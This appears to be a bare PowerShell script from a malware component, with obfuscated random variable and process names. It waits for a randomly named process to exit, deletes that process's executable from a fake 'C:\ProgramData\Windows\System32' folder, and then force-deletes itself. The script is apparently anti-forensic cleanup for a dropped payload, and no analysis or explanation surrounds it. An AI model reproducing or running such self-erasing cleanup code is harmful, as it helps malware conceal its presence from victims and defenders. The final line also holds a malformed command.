
$soNJkXUO = Get-Process 3K0JfF4BjXG6mMisOnUXL2mGOOBeDHM7vZK4ILhZbtc -ErrorAction SilentlyContinue
while ($soNJkXUO) {
  if (!$soNJkXUO.HasExited) {
	    write-host 'DtwpkcPr';
  } else {
      if (Test-Path -Path 'C:\ProgramData\Windows\System32\3K0JfF4BjXG6mMisOnUXL2mGOOBeDHM7vZK4ILhZbtc.exe') {
        Add-Type -AssemblyName Microsoft.VisualBasic;
        [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile('C:\ProgramData\Windows\System32\3K0JfF4BjXG6mMisOnUXL2mGOOBeDHM7vZK4ILhZbtc.exe','OnlyErrorDialogs','SendToRecycleBin');
        Remove-Item $script:MyInvocation.MyCommand.Path -Force
        break
      } else {
        Remove-Item $script:MyInvocation.MyCommand.Path -Force
        break
      }
  }
}
Remove-Item $script:MyInvocation.MyCommand.Path -Force
Remove -Variable soNJkXUO